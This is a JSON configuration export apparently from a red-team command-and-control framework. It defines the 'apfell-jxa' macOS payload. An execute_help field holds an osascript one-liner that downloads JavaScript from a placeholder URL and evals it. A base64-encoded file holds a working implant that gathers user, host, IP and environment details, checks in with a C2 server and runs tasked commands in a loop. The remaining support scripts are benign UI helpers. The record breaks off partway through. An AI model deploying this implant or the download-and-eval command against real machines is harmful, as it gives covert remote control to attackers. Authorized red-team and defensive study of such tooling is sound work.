{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "exports.command_name = function(task, command, params){\n        \/\/task is a dictionary of Task information\n        \/\/command is the single word command that caused this function to be called\n        \/\/params is a string of everything passed in except for the command\n        \/\/   if you pass in a json blob on the command line, then to get json back here call JSON.parse(params);\n        \/\/do stuff here, with access to the following commands:\n        does_file_exist(strPath);\n        convert_to_nsdata(strData);\n        write_data_to_file(data, filePath);\n        base64_decode(data);\n        base64_encode(data);\n    };\n    COMMAND_ENDS_HERE\n    ",
      "supported_os": "macOS (x64)",
      "execute_help": "osascript -l JavaScript -e \"eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http:\/\/domain.com\/payload.file')), $.NSUTF8StringEncoding)));\"",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@its_a_feature_",
      "note": "This payload uses JavaScript for Automation (JXA) for execution on macOS boxes. \nThere have been issues with macOS < 10.13 and encryption, so be sure to blank out the AESPSK and set key exchange to \"F\" when creating those payloads.",
      "supports_dynamic_loading": true,
      "deleted": false,
      "last_heartbeat": "05\/09\/2020 21:44:12",
      "ptype": "apfell-jxa",
      "file_extension": "js",
      "icon": null,
      "files": [
        {
          "apfell-jxa.js": "Ly8gQ3JlYXRlZCBieSBDb2R5IFRob21hcyAtIEBpdHNfYV9mZWF0dXJlXwpPYmpDLmltcG9ydCgnQ29jb2EnKTsKT2JqQy5pbXBvcnQoJ0ZvdW5kYXRpb24nKTsgLy90aGVyZSBieSBkZWZhdWx0IEkgdGhpbmssIGJ1dCBzYWZlIHRvIGluY2x1ZGUgYW55d2F5Ck9iakMuaW1wb3J0KCdzdGRsaWInKTsKT2JqQy5iaW5kRnVuY3Rpb24oJ0NGTWFrZUNvbGxlY3RhYmxlJywgWydpZCcsIFsndm9pZCAqJ10gXSk7CnZhciBjdXJyZW50QXBwID0gQXBwbGljYXRpb24uY3VycmVudEFwcGxpY2F0aW9uKCk7CmN1cnJlbnRBcHAuaW5jbHVkZVN0YW5kYXJkQWRkaXRpb25zID0gdHJ1ZTsKLy8tLS0tLS0tLS0tLS0tLUlNUExBTlQgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBhZ2VudHsKCWNvbnN0cnVjdG9yKCl7CgkJdGhpcy5wcm9jSW5mbyA9ICQuTlNQcm9jZXNzSW5mby5wcm9jZXNzSW5mbzsKCQl0aGlzLmhvc3RJbmZvID0gJC5OU0hvc3QuY3VycmVudEhvc3Q7CgkJdGhpcy5pZCA9ICIiOwoJCXRoaXMudXNlciA9IE9iakMuZGVlcFVud3JhcCh0aGlzLnByb2NJbmZvLnVzZXJOYW1lKTsKCQl0aGlzLmZ1bGxOYW1lID0gT2JqQy5kZWVwVW53cmFwKHRoaXMucHJvY0luZm8uZnVsbFVzZXJOYW1lKTsKCQkvL2V2ZXJ5IGVsZW1lbnQgaW4gdGhlIGFycmF5IG5lZWRzIHRvIGJlIHVud3JhcHBlZAoJCXRoaXMuaXAgPSBPYmpDLmRlZXBVbndyYXAodGhpcy5ob3N0SW5mby5hZGRyZXNzZXMpOyAvL3Byb2JhYmx5IGp1c3QgbmVlZCBbMF0KCQl0aGlzLnBpZCA9IHRoaXMucHJvY0luZm8ucHJvY2Vzc0lkZW50aWZpZXI7CgkJLy9ldmVyeSBlbGVtZW50IGluIHRoZSBhcnJheSBuZWVkcyB0byBiZSB1bndyYXBwZWQKCQl0aGlzLmhvc3QgPSBPYmpDLmRlZXBVbndyYXAodGhpcy5ob3N0SW5mby5uYW1lcyk7IC8vcHJvYmFibHkganVzdCBuZWVkIFswXQoJCS8vdGhpcyBpcyBhIGRpY3Rpb25hcnksIGJ1dCBldmVyeSAndmFsdWUnIG5lZWRzIHRvIGJlIHVud3JhcHBlZAoJCXRoaXMuZW52aXJvbm1lbnQgPSBPYmpDLmRlZXBVbndyYXAodGhpcy5wcm9jSW5mby5lbnZpcm9ubWVudCk7CgkJdGhpcy51cHRpbWUgPSB0aGlzLnByb2NJbmZvLnN5c3RlbVVwdGltZTsKCQkvL2V2ZXJ5IGVsZW1lbnQgaW4gdGhlIGFycmF5IG5lZWRzIHRvIGJlIHVud3JhcHBlZAoJCXRoaXMuYXJncyA9IE9iakMuZGVlcFVud3JhcCh0aGlzLnByb2NJbmZvLmFyZ3VtZW50cyk7CgkJdGhpcy5vc1ZlcnNpb24gPSB0aGlzLnByb2NJbmZvLm9wZXJhdGluZ1N5c3RlbVZlcnNpb25TdHJpbmcuanM7CgkJdGhpcy51dWlkID0gIlVVSURfSEVSRSI7Cgl9Cn0KdmFyIGFwZmVsbCA9IG5ldyBhZ2VudCgpOwovLy0tLS0tLS0tLS0tLS0tQmFzZSBDMiBJTkZPUk1BVElPTi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KY2xhc3MgYmFzZUMyewoJLy9UbyBjcmVhdGUgeW91ciBvd24gQzIsIGV4dGVuZCB0aGlzIGNsYXNzIGFuZCBpbXBsZW1lbnQgdGhlIHJlcXVpcmVkIGZ1bmN0aW9ucwoJLy9UaGUgbWFpbiBjb2RlIGRlcGVuZHMgb24gdGhlIG1lY2hhbmlzbSBiZWluZyBDMiB3aXRoIHRoZXNlIGZ1bmN0aW9ucy4KCS8vICAgdGhlIGltcGxlbWVudGF0aW9uIG9mIHRoZSBmdW5jdGlvbnMgZG9lc24ndCBtYXR0ZXIgdGhvdWdoCgkvLyAgIFlvdSdyZSB3ZWxjb21lIHRvIGFkZCBhZGRpdGlvbmFsIGZ1bmN0aW9ucyBhcyB3ZWxsLCBidXQgdGhpcyBpcyB0aGUgbWluaW11bQoJY29uc3RydWN0b3IoaW50ZXJ2YWwsIGJhc2V1cmwpewoJCXRoaXMuaW50ZXJ2YWwgPSBpbnRlcnZhbDsgLy9zZWNvbmRzIGJldHdlZW4gY2FsbGJhY2tzCgkJdGhpcy5iYXNldXJsID0gYmFzZXVybDsgLy93aGVyZSB0byByZWFjaCBvdXQgdG8KCQl0aGlzLmNvbW1hbmRzID0gW107Cgl9CgljaGVja2luKCl7CgkJLy9jaGVjayBpbiB3aXRoIGMyIHNlcnZlcgoJfQoJZ2V0VGFza2luZygpewoJCS8vcmVhY2ggb3V0IHRvIHdoZXJldmVyIHRvIGdldCB0YXNraW5nCgl9CglnZXRDb25maWcoKXsKCQkvL2dldHMgdGhlIGN1cnJlbnQgY29uZmlndXJhdGlvbiBmb3IgdGFza2luZwoJfQoJcG9zdFJlc3BvbnNlKHRhc2ssIG91dHB1dCl7CgkJLy9vdXRwdXQgYSByZXNwb25zZSB0byBhIHRhc2sKCX0KCXNldENvbmZpZyhwYXJhbXMpewoJCS8vdXBkYXRlcyB0aGUgY3VycmVudCBjb25maWd1cmF0aW9uIGZvciBob3cgdG8gZ2V0IHRhc2tpbmcKCX0KCWRvd25sb2FkKHRhc2ssIHBhcmFtcyl7CgkgICAgLy9nZXRzIGEgZmlsZSBmcm9tIHRoZSBhcGZlbGwgc2VydmVyIGluIHNvbWUgd2F5Cgl9Cgl1cGxvYWQodGFzaywgcGFyYW1zKXsKCSAgICAvL3VwbG9hZHMgYSBmaWxlIGluIHNvbWUgd2F5IHRvIHRoZSB0ZWFtc2VydmVyCgl9Cn0KLy8tLS0tLS0tLS0tLS0tIEMyUFJPRklMRV9IRVJFIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLy8tLS0tLS0tLS0tLS0tU0hBUkVEIENPTU1BTkQgQ09ERSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZG9lc19maWxlX2V4aXN0ID0gZnVuY3Rpb24oc3RyUGF0aCl7CiAgICB2YXIgZXJyb3IgPSAkKCk7CiAgICByZXR1cm4gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKHN0clBhdGgpLnN0cmluZ0J5U3RhbmRhcmRpemluZ1BhdGgsIGVycm9yKSwgZXJyb3IuY29kZSA9PT0gdW5kZWZpbmVkOwp9Owpjb252ZXJ0X3RvX25zZGF0YSA9IGZ1bmN0aW9uKHN0ckRhdGEpewogICAgLy8gaGVscGVyIGZ1bmN0aW9uIHRvIGNvbnZlcnQgVVRGOCBzdHJpbmdzIHRvIE5TRGF0YSBvYmplY3RzCiAgICB2YXIgdG1wU3RyaW5nID0gJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aENTdHJpbmdFbmNvZGluZyhzdHJEYXRhLCAkLk5TRGF0YS5OU1VuaWNvZGVTdHJpbmdFbmNvZGluZyk7CiAgICByZXR1cm4gdG1wU3RyaW5nLmRhdGFVc2luZ0VuY29kaW5nKCQuTlNEYXRhLk5TVVRGMTZTdHJpbmdFbmNvZGluZyk7Cn07CndyaXRlX2RhdGFfdG9fZmlsZSA9IGZ1bmN0aW9uKGRhdGEsIGZpbGVfcGF0aCl7CiAgICB0cnl7CiAgICAgICAgLy92YXIgb3Blbl9maWxlID0gY3VycmVudEFwcC5vcGVuRm9yQWNjZXNzKFBhdGgoZmlsZV9wYXRoKSwge3dyaXRlUGVybWlzc2lvbjogdHJ1ZX0pOwogICAgICAgIC8vY3VycmVudEFwcC5zZXRFb2Yob3Blbl9maWxlLCB7IHRvOiAwIH0pOyAvL2NsZWFyIHRoZSBjdXJyZW50IGZpbGUKICAgICAgICAvL2N1cnJlbnRBcHAud3JpdGUoZGF0YSwgeyB0bzogb3Blbl9maWxlLCBzdGFydGluZ0F0OiBjdXJyZW50QXBwLmdldEVvZihvcGVuX2ZpbGUpIH0pOwogICAgICAgIC8vY3VycmVudEFwcC5jbG9zZUFjY2VzcyhvcGVuX2ZpbGUpOwogICAgICAgIGlmKHR5cGVvZiBkYXRhID09ICJzdHJpbmciKXsKICAgICAgICAgICAgZGF0YSA9IGNvbnZlcnRfdG9fbnNkYXRhKGRhdGEpOwogICAgICAgIH0KICAgICAgICBpZiAoZGF0YS53cml0ZVRvRmlsZUF0b21pY2FsbHkoJChmaWxlX3BhdGgpLCB0cnVlKSl7CiAgICAgICAgICAgIHJldHVybiAiZmlsZSB3cml0dGVuIjsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuICJmYWlsZWQgdG8gd3JpdGUgZmlsZSI7CiAgICAgICAgfQogICAgIH0KICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuICJmYWlsZWQgdG8gd3JpdGUgdG8gZmlsZTogIiArIGVycm9yLnRvU3RyaW5nKCk7CiAgICAgfQp9OwpkZWZhdWx0X2xvYWQgPSBmdW5jdGlvbihjb250ZW50cyl7CiAgICB2YXIgbW9kdWxlID0ge2V4cG9ydHM6IHt9fTsKICAgIHZhciBleHBvcnRzID0gbW9kdWxlLmV4cG9ydHM7CiAgICBpZih0eXBlb2YgY29udGVudHMgPT0gInN0cmluZyIpewogICAgICAgIGV2YWwoY29udGVudHMpOwogICAgfQogICAgZWxzZXsKICAgICAgICBldmFsKGNvbnRlbnRzLmpzKTsKICAgIH0KICAgIHJldHVybiBtb2R1bGUuZXhwb3J0czsKfTsKYmFzZTY0X2RlY29kZSA9IGZ1bmN0aW9uKGRhdGEpewogICAgaWYodHlwZW9mIGRhdGEgPT0gInN0cmluZyIpewogICAgICAgIHZhciBuc19kYXRhID0gJC5OU0RhdGEuYWxsb2MuaW5pdFdpdGhCYXNlNjRFbmNvZGluZygkKGRhdGEpKTsKICAgIH0KICAgIGVsc2V7CiAgICAgICAgdmFyIG5zX2RhdGEgPSBkYXRhOwogICAgfQogICAgdmFyIGRlY29kZWRfZGF0YSA9ICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcobnNfZGF0YSwgJC5OU1VURjhTdHJpbmdFbmNvZGluZykuanM7CiAgICByZXR1cm4gZGVjb2RlZF9kYXRhOwp9OwpiYXNlNjRfZW5jb2RlID0gZnVuY3Rpb24oZGF0YSl7CiAgICBpZih0eXBlb2YgZGF0YSA9PSAic3RyaW5nIil7CiAgICAgICAgdmFyIG5zX2RhdGEgPSBjb252ZXJ0X3RvX25zZGF0YShkYXRhKTsKICAgIH0KICAgIGVsc2V7CiAgICAgICAgdmFyIG5zX2RhdGEgPSBkYXRhOwogICAgfQogICAgdmFyIGVuY29kZWQgPSBuc19kYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgIHJldHVybiBlbmNvZGVkOwp9Owp2YXIgZXhwb3J0cyA9IHt9OyAgLy8gZ2V0IHN0dWZmIHJlYWR5IGZvciBpbml0aWFsIGNvbW1hbmQgbGlzdGluZwovLy0tLS0tLS0tLS0tLS1DT01NQU5EU19IRVJFIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vY29uc29sZS5sb2coImFib3V0IHRvIGxvYWQgY29tbWFuZHMiKTsKdmFyIGNvbW1hbmRzX2RpY3QgPSBleHBvcnRzOwp2YXIganNpbXBvcnRzID0gIiI7CgovLy0tLS0tLS0tLS0tLS1HRVQgSVAgQU5EIENIRUNLSU4gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQppZiggJC5OU0RhdGUuZGF0ZS5jb21wYXJlKEMyLmtpbGxfZGF0ZSkgPT09ICQuTlNPcmRlcmVkRGVzY2VuZGluZyApewogICQuTlNBcHBsaWNhdGlvbi5zaGFyZWRBcHBsaWNhdGlvbi50ZXJtaW5hdGUodGhpcyk7Cn0KZm9yKGxldCBpPTA7IGkgPCBhcGZlbGwuaXAubGVuZ3RoOyBpKyspewoJbGV0IGlwID0gYXBmZWxsLmlwW2ldOwoJaWYgKGlwLmluY2x1ZGVzKCIuIikgJiYgaXAgIT09ICIxMjcuMC4wLjEiKXsgLy8gdGhlIGluY2x1ZGVzKCIuIikgaXMgdG8gbWFrZSBzdXJlIHdlJ3JlIGxvb2tpbmcgYXQgSVB2NAoJCS8vY29uc29sZS5sb2coImZvdW5kIGlwLCBjaGVja2luZyBpbiIpOwoJCUMyLmNvbW1hbmRzID0gIE9iamVjdC5rZXlzKGNvbW1hbmRzX2RpY3QpOwoJCUMyLmNoZWNraW4oaXAsYXBmZWxsLnBpZCxhcGZlbGwudXNlcixPYmpDLnVud3JhcChhcGZlbGwucHJvY0luZm8uaG9zdE5hbWUpLCJtYWNPUyIgKyAiICIgKyBhcGZlbGwub3NWZXJzaW9uLCAieDY0Iik7CgkJYnJlYWs7Cgl9Cn0KLy8tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1NQUlOIExPT1AgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpmdW5jdGlvbiBzbGVlcFdha2VVcCgpewogICAgd2hpbGUodHJ1ZSl7CiAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbChDMi5nZW5fc2xlZXBfdGltZSgpKTsKICAgICAgICBsZXQgb3V0cHV0ID0gIiI7CiAgICAgICAgbGV0IHRhc2sgPSBDMi5nZXRUYXNraW5nKCk7CiAgICAgICAgLy9jb25zb2xlLmxvZyhKU09OLnN0cmluZ2lmeSh0YXNrKSk7CiAgICAgICAgbGV0IGNvbW1hbmQgPSAiIjsKICAgICAgICB0cnl7CiAgICAgICAgCS8vY29uc29sZS5sb2coSlNPTi5zdHJpbmdpZnkodGFzaykpOwogICAgICAgIAlpZih0YXNrLmxlbmd0aCA9PT0gMCl7CiAgICAgICAgCQljb250aW51ZTsKICAgICAgICAJfQogICAgICAgIAl0YXNrID0gdGFza1swXTsKICAgICAgICAJLy9jb25zb2xlLmxvZyhKU09OLnN0cmluZ2lmeSh0YXNrKSk7CiAgICAgICAgICAgIGNvbW1hbmQgPSB0YXNrWyJjb21tYW5kIl07CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgIG91dHB1dCA9IGNvbW1hbmRzX2RpY3RbY29tbWFuZF0odGFzaywgY29tbWFuZCwgdGFza1sncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgICAgICBpZihlcnJvci50b1N0cmluZygpLmluY2x1ZGVzKCJjb21tYW5kc19kaWN0W2NvbW1hbmRdIGlzIG5vdCBhIGZ1bmN0aW9uIikpewogICAgICAgICAgICAgICAgICAgIG91dHB1dCA9eyJ1c2VyX291dHB1dCI6ICJVbmtub3duIGNvbW1hbmQ6ICIgKyBjb21tYW5kLCAic3RhdHVzIjogImVycm9yIiwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSB7InVzZXJfb3V0cHV0IjogZXJyb3IudG9TdHJpbmcoKSwgInN0YXR1cyI6ICJlcnJvciIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBDMi5wb3N0UmVzcG9uc2UodGFzaywgb3V0cHV0KTsKICAgICAgICB9CiAgICAgICAgY2F0Y2goZXJyb3IpewogICAgICAgICAgICBDMi5wb3N0UmVzcG9uc2UodGFzaywgeyJ1c2VyX291dHB1dCI6IGVycm9yLnRvU3RyaW5nKCksICJzdGF0dXMiOiAiZXJyb3IiLCAiY29tcGxldGVkIjogdHJ1ZX0pOwogICAgICAgIH0KICAgICAgICAvL3Rhc2tbImNvbW1hbmQiXSA9ICJub25lIjsgLy9yZXNldCBqdXN0IGluIGNhc2Ugc29tZXRoaW5nIGdvZXMgd2VpcmQKICAgIH0KfQpzbGVlcFdha2VVcCgpOwo="
        }
      ],
      "support_scripts": [
        {
          "name": "show_process_additional_info_modal",
          "script": "ZnVuY3Rpb24oZWxlbSl7DQogICAgY29uc29sZS5sb2coZWxlbSk7DQogICAgdmFyIHVuaXF1ZU5hbWUgPSBlbGVtLmdldEF0dHJpYnV0ZSgibW9kYWwtbmFtZSIpOw0KICAgIHZhciBjb250ZW50ID0gZWxlbS5nZXRBdHRyaWJ1dGUoImFkZGl0aW9uYWwtaW5mbyIpOw0KICAgIHZhciB1bmlxdWVOYW1lSWQgPSAnIycgKyB1bmlxdWVOYW1lOw0KICAgIHZhciBtb2RhbEJvZHkgPSB1bmlxdWVOYW1lSWQgKyAnX2JvZHknOw0KICAgICQobW9kYWxCb2R5KS5odG1sKGNvbnRlbnQpOw0KICAgICQobW9kYWxCb2R5ICsgJyA+IHByZTpsYXN0JykuY3NzKCJ3b3JkLXdyYXAiLCAiYnJlYWstd29yZCIpOw0KICAgICQobW9kYWxCb2R5ICsgJyA+IHByZTpsYXN0JykuY3NzKCJ3aGl0ZS1zcGFjZSIsICJwcmUtd3JhcCIpOw0KICAgICQodW5pcXVlTmFtZUlkKS5tb2RhbCgnc2hvdycpOw0KfQ=="
        },
        {
          "name": "integrity_level_to_string",
          "script": "ZnVuY3Rpb24oaW50ZWdyaXR5TGV2ZWwpew0KICAgIHN3aXRjaChpbnRlZ3JpdHlMZXZlbCkNCiAgICB7DQogICAgICAgIGNhc2UgIlMtMS0xNi0wIjoNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJVTlRSVVNURURfTUFOREFUT1JZX0xFVkVMIjsNCiAgICAgICAgfQ0KICAgICAgICBjYXNlICJTLTEtMTYtNDA5NiI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiTE9XX01BTkRBVE9SWV9MRVZFTCI7DQogICAgICAgIH0NCiAgICAgICAgY2FzZSAiUy0xLTE2LTgxOTIiOg0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gIk1FRElVTV9NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi04NDQ4IjoNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJNRURJVU1fUExVU19NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi0xMjI4OCI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiSElHSF9NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi0xNjM4NCI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiU1lTVEVNX01BTkRBVE9SWV9MRVZFTCI7DQogICAgICAgIH0NCiAgICAgICAgY2FzZSAiUy0xLTE2LTIwNDgwIjoNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICJQUk9URUNURURfUFJPQ0VTU19NQU5EQVRPUllfTEVWRUwiOw0KICAgICAgICB9DQogICAgICAgIGNhc2UgIlMtMS0xNi0yODY3MiI6DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAiU0VDVVJFX1BST0NFU1NfTUFOREFUT1JZX0xFVkVMIjsNCiAgICAgICAgfQ0KICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KfQ=="
        },
        {
          "name": "create_process_additional_info_modal",
          "script": "ZnVuY3Rpb24odW5pcXVlTmFtZSl7DQogICAgdmFyIGlkID0gIiMiICsgdW5pcXVlTmFtZTsNCiAgICBpZiAoJChpZCkubGVuZ3RoICE9IDApDQogICAgew0KICAgICAgICByZXR1cm4gIiI7DQogICAgfQ0KICAgIHZhciBodG1sID0gYA0KICAgIDwhLS0gVEhJUyBJUyBPVVIgTU9EQUwgRk9SIEFERElORyBBIENPTU1FTlQgLS0+DQo8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIGJzLWV4YW1wbGUtbW9kYWwtbGciIGlkPSJgICsgdW5pcXVlTmFtZSArIGAiIHJvbGU9ImRpYWxvZyIgPg0KICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyBtb2RhbC1sZyIgcm9sZT0iZG9jdW1lbnQiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50Ij4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciBiZy1kYXJrIHRleHQtd2hpdGUiPg0KICAgICAgICAgICAgQWRkaXRpb25hbCBQcm9jZXNzIERldGFpbHMNCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IiBpZD0iYCArIHVuaXF1ZU5hbWUgKyBgX2JvZHkiPg0KICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIj4NCiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj5PSzwvYnV0dG9uPg0KICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8L2Rpdj4NCjwhLS0gRU5EIE1PREFMIEZPUiBBRERJTkcgQSBDT01NRU5UIC0tPmA7DQogICAgcmV0dXJuIGh0bWw7DQp9"
        },
        {
          "name": "file_size_to_human_readable_string",
          "script": "ZnVuY3Rpb24oZmlsZVNpemUpew0KICAgIHZhciB0aHJlc2ggPSAxMDI0Ow0KICAgIGlmKE1hdGguYWJzKGZpbGVTaXplKSA8IHRocmVzaCkgew0KICAgICAgICByZXR1cm4gZmlsZVNpemUgKyAnIEInOw0KICAgIH0NCiAgICB2YXIgdW5pdHMgPSBbJ0tCJywnTUInLCdHQicsJ1RCJywnUEInLCdFQicsJ1pCJywnWUInXTsNCiAgICB2YXIgdSA9IC0xOw0KICAgIGRvIHsNCiAgICAgICAgZmlsZVNpemUgLz0gdGhyZXNoOw0KICAgICAgICArK3U7DQogICAgfSB3aGlsZShNYXRoLmFicyhmaWxlU2l6ZSkgPj0gdGhyZXNoICYmIHUgPCB1bml0cy5sZW5ndGggLSAxKTsNCiAgICByZXR1cm4gZmlsZVNpemUudG9GaXhlZCgxKSsnICcrdW5pdHNbdV07DQogIHJldHVybiBvdXRwdXQ7DQp9"
        },
        {
          "name": "collapsable",
          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        },
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        }
      ],
      "c2_profiles": {
        "default": [
          {
